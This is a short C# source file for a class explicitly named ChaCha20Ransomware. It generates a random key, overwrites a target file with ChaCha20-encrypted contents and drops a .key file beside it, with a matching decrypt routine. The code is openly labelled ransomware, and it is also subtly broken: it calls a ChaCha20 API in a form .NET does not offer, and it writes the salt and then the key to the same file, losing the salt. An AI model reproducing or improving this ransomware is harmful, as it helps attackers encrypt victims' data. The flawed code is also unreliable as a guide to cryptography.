using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class ChaCha20Ransomware
{
    public static void EncryptFile(string filePath, string salt)
    {
        // Generate a new random key
        byte[] key = new byte[32];
        using (var rng = RandomNumberGenerator.Create())
        {
            rng.GetBytes(key);
        }

        // Create a new ChaCha20 instance
        using (var chacha20 = new ChaCha20(key, Encoding.UTF8.GetBytes(salt)))
        {
            // Read the file contents
            byte[] fileContents = File.ReadAllBytes(filePath);

            // Encrypt the file contents
            byte[] encryptedContents = chacha20.Encrypt(fileContents);

            // Write the encrypted contents back to the file
            File.WriteAllBytes(filePath, encryptedContents);

            // Write the salt and key to a separate file
            File.WriteAllBytes(filePath + ".key", Encoding.UTF8.GetBytes(salt));
            File.WriteAllBytes(filePath + ".key", key);
        }
    }

    public static void DecryptFile(string filePath, string salt, byte[] key)
    {
        // Create a new ChaCha20 instance
        using (var chacha20 = new ChaCha20(key, Encoding.UTF8.GetBytes(salt)))
        {
            // Read the encrypted file contents
            byte[] encryptedContents = File.ReadAllBytes(filePath);

            // Decrypt the file contents
            byte[] decryptedContents = chacha20.Decrypt(encryptedContents);

            // Write the decrypted contents back to the file
            File.WriteAllBytes(filePath, decryptedContents);
        }
    }
}